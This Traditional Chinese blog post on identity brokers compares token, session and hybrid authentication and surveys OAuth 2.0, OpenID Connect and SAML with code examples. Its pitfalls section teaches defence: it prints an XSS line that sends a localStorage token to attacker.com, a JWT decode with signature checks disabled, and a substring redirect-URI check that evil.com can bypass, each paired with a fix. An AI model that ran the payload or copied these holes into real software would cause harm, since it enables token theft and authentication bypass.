---
title: "身份代理：分散式系統中的集中式身份驗證"
date: 2021-12-24
lang: zh-TW
categories: Development
tags: [Architecture, Security, Authentication]
excerpt: "身份代理在多個系統中集中管理身份驗證，但實作選擇會影響安全性、效能和使用者體驗。了解模式、權衡和陷阱。"
thumbnail: /assets/security/lock.png
series: authentication
---

身份代理作為分散式系統中身份驗證蔓延問題的解決方案應運而生。身份代理集中管理這些問題，提供單一登入（SSO）和統一的身份管理，而不是讓每個應用程式管理自己的使用者憑證和身份驗證邏輯。然而，這種集中化引入了新的架構挑戰：工作階段管理複雜性、單點故障以及安全性與使用者體驗之間的微妙平衡。

本文探討了企業系統、雲端應用程式和微服務架構中的身份代理模式。我們將剖析常見的實作方法，評估 OAuth 2.0、SAML 和 OpenID Connect 之間的協定選擇，並理解基於權杖和基於工作階段的身份驗證之間的權衡。透過真實世界的實作和安全事件，我們揭示了為什麼身份代理既必不可少又複雜。

## 理解身份代理

在深入實作模式之前，理解身份代理的作用以及它們存在的原因至關重要。身份代理位於應用程式和身份提供者之間，轉換身份驗證協定並管理使用者工作階段。

### 核心問題：身份驗證蔓延

沒有身份代理時，每個應用程式獨立管理身份驗證：

!!!error "🚫 沒有身份代理的問題"
    **憑證重複**
    - 使用者為每個應用程式維護單獨的憑證
    - 跨系統重複使用密碼會產生安全風險
    - 密碼重設需要聯絡每個應用程式
    - 沒有統一的密碼政策執行
    
    **整合複雜性**
    - 每個應用程式實作自己的身份驗證
    - 與身份提供者的多個整合
    - 不一致的安全實作
    - 難以新增新的身份提供者
    
    **使用者體驗問題**
    - 使用者分別登入每個應用程式
    - 跨系統沒有單一登入
    - 工作階段管理不一致
    - 登出不會在應用程式之間傳播

身份代理透過集中身份驗證邏輯並為應用程式提供統一介面來解決這些問題。

### 身份代理提供什麼

身份代理充當應用程式和身份提供者之間的中介：

!!!anote "🔑 身份代理功能"
    **協定轉換**
    - 應用程式使用一種協定（例如 OAuth 2.0）
    - 身份提供者使用不同的協定（SAML、LDAP、OAuth）
    - 代理在協定之間進行轉換
    - 應用程式不需要特定於提供者的程式碼
    
    **單一登入（SSO）**
    - 使用者使用代理進行一次身份驗證
    - 代理向應用程式頒發權杖/工作階段
    - 應用程式信任代理的身份驗證
    - 跨多個應用程式的無縫存取
    
    **身份聯合**
    - 連接多個身份提供者
    - 使用者可以使用企業 AD、Google、GitHub 等進行身份驗證
    - 代理規範化使用者屬性
    - 跨提供者的統一身份
    
    **工作階段管理**
    - 集中式工作階段追蹤
    - 跨所有應用程式的單點登出
    - 工作階段逾時政策
    - 並行工作階段控制

流行的身份代理包括 Keycloak、Auth0、Okta、Azure AD 和 AWS Cognito。

## 基於權杖與基於工作階段的身份驗證

身份代理可以使用權杖或工作階段實作身份驗證，每種方式都有不同的權衡。

### 基於權杖的身份驗證：無狀態且可擴展

基於權杖的身份驗證使用加密簽章的權杖（通常是 JWT）來表示已驗證的使用者：

```python
# 基於權杖的身份驗證流程
from jose import jwt
from datetime import datetime, timedelta

class TokenAuthBroker:
    def __init__(self, secret_key):
        self.secret_key = secret_key
    
    def authenticate(self, username, password):
        # 使用身份提供者驗證憑證
        if self.verify_credentials(username, password):
            # 頒發 JWT 權杖
            payload = {
                'sub': username,
                'iat': datetime.utcnow(),
                'exp': datetime.utcnow() + timedelta(hours=1),
                'roles': self.get_user_roles(username)
            }
            token = jwt.encode(payload, self.secret_key, algorithm='HS256')
            return token
        return None
    
    def validate_token(self, token):
        try:
            payload = jwt.decode(token, self.secret_key, algorithms=['HS256'])
            return payload
        except jwt.ExpiredSignatureError:
            return None
        except jwt.JWTError:
            return None

# 應用程式在不聯絡代理的情況下驗證權杖
def protected_endpoint(request):
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    payload = broker.validate_token(token)
    
    if payload:
        return f"歡迎 {payload['sub']}"
    return "未授權", 401
```

!!!success "✅ 基於權杖的優勢"
    **無狀態架構**
    - 不需要伺服器端工作階段儲存
    - 應用程式獨立驗證權杖
    - 無需工作階段複製即可水平擴展
    - 負載平衡器中不需要工作階段親和性
    
    **效能**
    - 每個請求無需資料庫查找
    - 驗證是加密簽章檢查
    - 減少身份驗證檢查的延遲
    - 降低身份代理的負載
    
    **微服務友善**
    - 權杖在服務之間傳遞
    - 不需要共享工作階段儲存
    - 服務獨立驗證權杖
    - 解耦架構

然而，基於權杖的身份驗證有顯著的缺點：

!!!warning "⚠️ 基於權杖的挑戰"
    **撤銷困難**
    - 權杖在過期前有效
    - 無法立即撤銷被洩露的權杖
    - 登出不會使現有權杖失效
    - 需要權杖黑名單（破壞無狀態優勢）
    
    **權杖大小**
    - JWT 包含使用者資料和聲明
    - 每個請求都發送
    - 比工作階段 ID 大
    - 行動客戶端的頻寬開銷
    
    **安全風險**
    - 權杖儲存在瀏覽器中（XSS 漏洞）
    - 長期權杖增加暴露視窗
    - 權杖被竊允許在過期前冒充
    - 重新整理權杖管理複雜性

### 基於工作階段的身份驗證：有狀態但可控

基於工作階段的身份驗證使用伺服器端工作階段，將工作階段 ID 發送給客戶端：

```python
# 基於工作階段的身份驗證流程
import secrets
from datetime import datetime, timedelta

class SessionAuthBroker:
    def __init__(self):
        self.sessions = {}  # 生產環境：Redis、資料庫
    
    def authenticate(self, username, password):
        # 使用身份提供者驗證憑證
        if self.verify_credentials(username, password):
            # 建立工作階段
            session_id = secrets.token_urlsafe(32)
            self.sessions[session_id] = {
                'username': username,
                'created': datetime.utcnow(),
                'expires': datetime.utcnow() + timedelta(hours=1),
                'roles': self.get_user_roles(username)
            }
            return session_id
        return None
    
    def validate_session(self, session_id):
        session = self.sessions.get(session_id)
        if session and session['expires'] > datetime.utcnow():
            return session
        return None
    
    def revoke_session(self, session_id):
        # 立即撤銷
        if session_id in self.sessions:
            del self.sessions[session_id]
            return True
        return False

# 應用程式使用代理檢查工作階段
def protected_endpoint(request):
    session_id = request.cookies.get('session_id')
    session = broker.validate_session(session_id)
    
    if session:
        return f"歡迎 {session['username']}"
    return "未授權", 401
```

!!!success "✅ 基於工作階段的優勢"
    **立即撤銷**
    - 工作階段儲存在伺服器端
    - 登出立即使工作階段失效
    - 被洩露的工作階段可以立即撤銷
    - 細粒度的工作階段控制
    
    **更小的客戶端儲存**
    - 只有工作階段 ID 發送給客戶端
    - 最小的頻寬開銷
    - 使用者資料儲存在伺服器端
    - 減少 XSS 暴露
    
    **靈活的工作階段管理**
    - 無需客戶端變更即可更新工作階段資料
    - 追蹤工作階段活動和位置
    - 實作並行工作階段限制
    - 豐富的工作階段中繼資料

基於工作階段的身份驗證也有權衡：

!!!warning "⚠️ 基於工作階段的挑戰"
    **可擴展性複雜性**
    - 需要共享工作階段儲存（Redis、資料庫）
    - 跨伺服器的工作階段複製
    - 負載平衡器工作階段親和性或黏性工作階段
    - 水平擴展更複雜
    
    **效能開銷**
    - 每個請求都需要資料庫查找
    - 到工作階段儲存的網路延遲
    - 身份代理的負載更高
    - 大規模時的潛在瓶頸
    
    **分散式系統挑戰**
    - 微服務必須呼叫代理進行驗證
    - 每個請求的網路依賴
    - 服務鏈中的延遲增加
    - 代理成為關鍵依賴

### 混合方法：短期權杖與重新整理權杖

許多現代系統使用混合方法，結合兩者的優勢：

```python
# 使用存取權杖和重新整理權杖的混合身份驗證
class HybridAuthBroker:
    def __init__(self, secret_key):
        self.secret_key = secret_key
        self.refresh_tokens = {}  # 伺服器端重新整理權杖儲存
    
    def authenticate(self, username, password):
        if self.verify_credentials(username, password):
            # 短期存取權杖（15 分鐘）
            access_token = jwt.encode({
                'sub': username,
                'exp': datetime.utcnow() + timedelta(minutes=15),
                'type': 'access'
            }, self.secret_key, algorithm='HS256')
            
            # 長期重新整理權杖（7 天）儲存在伺服器端
            refresh_token = secrets.token_urlsafe(32)
            self.refresh_tokens[refresh_token] = {
                'username': username,
                'expires': datetime.utcnow() + timedelta(days=7)
            }
            
            return {
                'access_token': access_token,
                'refresh_token': refresh_token,
                'expires_in': 900  # 15 分鐘
            }
        return None
    
    def refresh_access_token(self, refresh_token):
        # 驗證重新整理權杖（伺服器端檢查）
        token_data = self.refresh_tokens.get(refresh_token)
        if token_data and token_data['expires'] > datetime.utcnow():
            # 頒發新的存取權杖
            access_token = jwt.encode({
                'sub': token_data['username'],
                'exp': datetime.utcnow() + timedelta(minutes=15),
                'type': 'access'
            }, self.secret_key, algorithm='HS256')
            return access_token
        return None
    
    def logout(self, refresh_token):
        # 撤銷重新整理權杖
        if refresh_token in self.refresh_tokens:
            del self.refresh_tokens[refresh_token]
```

!!!tip "🎯 混合方法的優勢"
    **平衡的安全性**
    - 短期存取權杖限制暴露視窗
    - 被洩露的存取權杖很快過期
    - 重新整理權杖可以立即撤銷
    - 登出使重新整理權杖失效
    
    **效能和可擴展性**
    - 存取權杖本地驗證（無狀態）
    - 重新整理權杖檢查不頻繁（每 15 分鐘）
    - 降低身份代理的負載
    - 像基於權杖的身份驗證一樣可擴展
    
    **使用者體驗**
    - 在背景無縫重新整理權杖
    - 無需頻繁重新身份驗證
    - 登出立即生效
    - 安全性和便利性之間的平衡

這種混合方法被 OAuth 2.0 和 OpenID Connect 使用，代表了業界最佳實務。

## 協定選擇：OAuth 2.0、SAML 和 OpenID Connect

身份代理必須支援各種身份驗證協定。理解它們的差異對於實作決策至關重要。

### OAuth 2.0：授權框架

OAuth 2.0 是一個授權框架，而不是身份驗證協定，儘管經常用於兩者：

```python
# OAuth 2.0 授權碼流程
from flask import Flask, request, redirect
import requests

app = Flask(__name__)

BROKER_AUTH_URL = 'https://broker.example.com/oauth/authorize'
BROKER_TOKEN_URL = 'https://broker.example.com/oauth/token'
CLIENT_ID = 'your_client_id'
CLIENT_SECRET = 'your_client_secret'
REDIRECT_URI = 'https://app.example.com/callback'

@app.route('/login')
def login():
    # 將使用者重新導向到身份代理
    auth_url = f"{BROKER_AUTH_URL}?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=openid profile email"
    return redirect(auth_url)

@app.route('/callback')
def callback():
    # 代理使用授權碼重新導向回來
    code = request.args.get('code')
    
    # 用授權碼交換存取權杖
    token_response = requests.post(BROKER_TOKEN_URL, data={
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET
    })
    
    tokens = token_response.json()
    access_token = tokens['access_token']
    
    # 使用存取權杖取得使用者資訊
    user_response = requests.get(
        'https://broker.example.com/userinfo',
        headers={'Authorization': f'Bearer {access_token}'}
    )
    
    user_info = user_response.json()
    # 使用 user_info 建立應用程式工作階段
    return f"歡迎 {user_info['name']}"
```

!!!anote "📋 OAuth 2.0 特徵"
    **設計用於**
    - 委派授權
    - 第三方 API 存取
    - 行動和 Web 應用程式
    - 現代 REST API
    
    **優勢**
    - 簡單的基於 HTTP 的協定
    - 廣泛的業界採用
    - 行動友善
    - 靈活的授權類型
    
    **局限性**
    - 不是為身份驗證設計的
    - 沒有標準的使用者資訊格式
    - 需要額外的設定檔端點
    - 權杖格式未標準化

### OpenID Connect：OAuth 2.0 之上的身份驗證層

OpenID Connect（OIDC）專門為身份驗證擴展了 OAuth 2.0：

```python
# OpenID Connect 在 OAuth 2.0 流程中新增 ID 權杖
from jose import jwt

@app.route('/oidc-callback')
def oidc_callback():
    code = request.args.get('code')
    
    # 用授權碼交換權杖
    token_response = requests.post(BROKER_TOKEN_URL, data={
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET
    })
    
    tokens = token_response.json()
    id_token = tokens['id_token']  # OIDC 新增 ID 權杖
    access_token = tokens['access_token']
    
    # 驗證和解碼 ID 權杖
    # ID 權杖包含使用者身份聲明
    user_claims = jwt.decode(
        id_token,
        key=get_broker_public_key(),
        algorithms=['RS256'],
        audience=CLIENT_ID
    )
    
    # ID 權杖包含：sub、name、email 等
    return f"歡迎 {user_claims['name']} ({user_claims['email']})"
```

!!!success "✅ OpenID Connect 優勢"
    **專為身份驗證而建構**
    - ID 權杖包含使用者身份
    - 標準化的使用者聲明
    - 不需要額外的設定檔端點
    - 清晰的身份驗證語義
    
    **安全功能**
    - ID 權杖是簽章的 JWT
    - 加密驗證
    - 受眾和頒發者驗證
    - 用於重放保護的 nonce
    
    **業界標準**
    - 所有主要身份提供者都支援
    - 廣泛的函式庫支援
    - 文件完善的規範
    - 積極的開發和更新

### SAML 2.0：企業標準

SAML（安全斷言標記語言）是傳統的企業身份驗證協定：

```python
# SAML 2.0 身份驗證流程（簡化）
from lxml import etree
from signxml import XMLVerifier

@app.route('/saml/login')
def saml_login():
    # 產生 SAML 身份驗證請求
    saml_request = f"""
    <samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                        ID="{generate_request_id()}"
                        Version="2.0"
                        IssueInstant="{datetime.utcnow().isoformat()}Z"
                        Destination="{BROKER_SSO_URL}">
        <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
            {SERVICE_PROVIDER_ID}
        </saml:Issuer>
    </samlp:AuthnRequest>
    """
    
    # 編碼並重新導向到身份代理
    encoded_request = base64.b64encode(saml_request.encode()).decode()
    sso_url = f"{BROKER_SSO_URL}?SAMLRequest={encoded_request}"
    return redirect(sso_url)

@app.route('/saml/acs', methods=['POST'])
def saml_assertion_consumer():
    # 代理將 SAML 回應發送回來
    saml_response = request.form['SAMLResponse']
    decoded_response = base64.b64decode(saml_response)
    
    # 驗證 SAML 斷言簽章
    xml_doc = etree.fromstring(decoded_response)
    verified_data = XMLVerifier().verify(
        xml_doc,
        x509_cert=get_broker_certificate()
    ).signed_xml
    
    # 從斷言中提取使用者屬性
    nameid = xml_doc.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}NameID').text
    attributes = extract_saml_attributes(xml_doc)
    
    return f"歡迎 {attributes['name']}"
```

!!!anote "🏢 SAML 特徵"
    **設計用於**
    - 企業單一登入
    - 組織之間的聯合
    - 傳統企業系統
    - 強安全要求
    
    **優勢**
    - 成熟且經過實戰檢驗
    - 豐富的屬性交換
    - 強大的安全功能
    - 企業採用
    
    **劣勢**
    - 基於 XML（冗長且複雜）
    - 不適合行動裝置
    - 學習曲線陡峭
    - 現代工具有限

### 協定選擇指南

!!!tip "🎯 選擇正確的協定"
    **使用 OpenID Connect 當：**
    - 建構新應用程式
    - 需要行動支援
    - 想要現代 REST API
    - 需要簡單整合
    - 面向消費者使用者
    
    **使用 SAML 當：**
    - 與企業系統整合
    - 企業 IT 政策要求
    - 需要豐富的屬性交換
    - 與其他組織聯合
    - 需要傳統系統相容性
    
    **使用 OAuth 2.0 當：**
    - 需要 API 授權（不是身份驗證）
    - 第三方存取資源
    - 委派權限
    - 與 OIDC 結合用於身份驗證

像 Keycloak 這樣的現代身份代理支援所有三種協定，允許應用程式根據需要進行選擇。

## 常見陷阱和安全問題

身份代理實作經常遭受常見的安全漏洞和設計錯誤。

### 陷阱 1：在本地儲存中儲存權杖

許多應用程式將權杖儲存在瀏覽器本地儲存中，從而產生 XSS 漏洞：

```javascript
// ❌ 不安全：在本地儲存中儲存權杖
function login(username, password) {
    fetch('/api/login', {
        method: 'POST',
        body: JSON.stringify({ username, password })
    })
    .then(res => res.json())
    .then(data => {
        // 容易受到 XSS 攻擊
        localStorage.setItem('access_token', data.access_token);
        localStorage.setItem('refresh_token', data.refresh_token);
    });
}

// 任何 XSS 漏洞都可以竊取權杖
// <script>
//   fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'));
// </script>
```

!!!error "🚫 本地儲存漏洞"
    **XSS 攻擊向量**
    - JavaScript 可以存取本地儲存
    - 任何 XSS 漏洞都會暴露權杖
    - 第三方指令碼可以竊取權杖
    - 沒有針對指令碼注入的保護
    
    **影響**
    - 完全帳戶接管
    - 權杖在過期前有效
    - 攻擊者可以冒充使用者
    - 難以偵測竊取

使用 HTTP-only cookie 的更好方法：

```javascript
// ✅ 安全：使用 HTTP-only cookie
// 伺服器設定 HTTP-only cookie（JavaScript 無法存取）
@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    tokens = broker.authenticate(data['username'], data['password'])
    
    response = make_response({'status': 'success'})
    
    # HTTP-only cookie 防止 JavaScript 存取
    response.set_cookie(
        'access_token',
        tokens['access_token'],
        httponly=True,  # 防止 JavaScript 存取
        secure=True,    # 僅 HTTPS
        samesite='Strict'  # CSRF 保護
    )
    
    return response

// 客戶端：不需要權杖處理
function login(username, password) {
    fetch('/api/login', {
        method: 'POST',
        credentials: 'include',  // 發送 cookie
        body: JSON.stringify({ username, password })
    });
}
```

### 陷阱 2：缺少權杖驗證

應用程式有時會跳過適當的權杖驗證：

```python
# ❌ 不安全：信任權杖而不驗證
@app.route('/api/user')
def get_user():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    
    # 解碼而不驗證！
    payload = jwt.decode(token, options={"verify_signature": False})
    
    return {'user': payload['sub']}  # 攻擊者可以偽造權杖！
```

!!!error "🚫 驗證失敗"
    **缺少簽章驗證**
    - 攻擊者可以建立假權杖
    - 沒有加密驗證
    - 完全繞過身份驗證
    
    **缺少過期檢查**
    - 過期的權杖仍然被接受
    - 被竊的權杖無限期有效
    - 沒有基於時間的安全性
    
    **缺少受眾驗證**
    - 接受來自其他應用程式的權杖
    - 跨應用程式權杖重複使用
    - 權限提升風險

適當的權杖驗證：

```python
# ✅ 安全：完整的權杖驗證
from jose import jwt, JWTError

@app.route('/api/user')
def get_user():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    
    try:
        payload = jwt.decode(
            token,
            key=get_public_key(),
            algorithms=['RS256'],  # 指定允許的演算法
            audience='my-application',  # 驗證受眾
            issuer='https://broker.example.com'  # 驗證頒發者
        )
        
        # 權杖有效且已驗證
        return {'user': payload['sub']}
        
    except jwt.ExpiredSignatureError:
        return {'error': '權杖已過期'}, 401
    except jwt.JWTClaimsError:
        return {'error': '無效的聲明'}, 401
    except JWTError:
        return {'error': '無效的權杖'}, 401
```

### 陷阱 3：不安全的重新導向 URI

OAuth 2.0 重新導向 URI 驗證對於安全性至關重要：

```python
# ❌ 不安全：弱重新導向 URI 驗證
@app.route('/oauth/authorize')
def authorize():
    client_id = request.args.get('client_id')
    redirect_uri = request.args.get('redirect_uri')
    
    # 弱驗證：子字串比對
    if 'example.com' in redirect_uri:
        # 產生授權碼
        code = generate_auth_code(client_id)
        return redirect(f"{redirect_uri}?code={code}")
    
    return "無效的重新導向 URI", 400

# 攻擊者可以使用：https://evil.com?victim=example.com
# 驗證通過，授權碼發送給攻擊者！
```

!!!error "🚫 重新導向 URI 漏洞"
    **開放重新導向**
    - 授權碼發送給攻擊者
    - 可能的帳戶接管
    - 啟用網路釣魚攻擊
    
    **子網域攻擊**
    - 弱驗證允許子網域
    - 攻擊者註冊惡意子網域
    - 竊取授權碼

安全的重新導向 URI 驗證：

```python
# ✅ 安全：嚴格的重新導向 URI 驗證
REGISTERED_CLIENTS = {
    'client123': {
        'redirect_uris': [
            'https://app.example.com/callback',
            'https://app.example.com/oauth/callback'
        ]
    }
}

@app.route('/oauth/authorize')
def authorize():
    client_id = request.args.get('client_id')
    redirect_uri = request.args.get('redirect_uri')
    
    # 與註冊的 URI 精確比對
    client = REGISTERED_CLIENTS.get(client_id)
    if not client or redirect_uri not in client['redirect_uris']:
        return "無效的重新導向 URI", 400
    
    code = generate_auth_code(client_id)
    return redirect(f"{redirect_uri}?code={code}")
```

## 結論

身份代理在分散式系統中集中管理身份驗證，提供單一登入、協定轉換和統一的身份管理。然而，實作選擇會顯著影響安全性、效能和使用者體驗。

基於權杖和基於工作階段的身份驗證之間的選擇涉及基本權衡。基於權杖的身份驗證提供無狀態可擴展性和微服務相容性，但在撤銷和安全風險方面存在困難。基於工作階段的身份驗證提供立即撤銷和細粒度控制，但引入了可擴展性複雜性。使用短期存取權杖和伺服器端重新整理權杖的混合方法代表了業界最佳實務，平衡了安全性、效能和使用者體驗。

協定選擇取決於您的環境和要求。OpenID Connect 是新應用程式的現代標準，提供簡單的整合、行動支援和專為身份驗證而建構的功能。儘管複雜，SAML 對於企業整合和傳統系統仍然至關重要。OAuth 2.0 服務於授權需求，但需要 OpenID Connect 才能進行適當的身份驗證。

常見陷阱困擾著身份代理實作。在本地儲存中儲存權杖會產生 XSS 漏洞——改用 HTTP-only cookie。缺少權杖驗證允許攻擊者偽造權杖——始終驗證簽章、過期、受眾和頒發者。弱重新導向 URI 驗證使授權碼被竊——對註冊的 URI 使用精確比對。

身份代理是現代分散式系統的基本基礎設施，但它們需要仔細實作。理解身份驗證方法之間的權衡、選擇適當的協定以及避免常見的安全陷阱可確保您的身份代理增強而不是破壞您的安全態勢。複雜性是合理的，因為它帶來了好處：統一的身份驗證、改進的使用者體驗以及整個應用程式生態系統的集中安全控制。
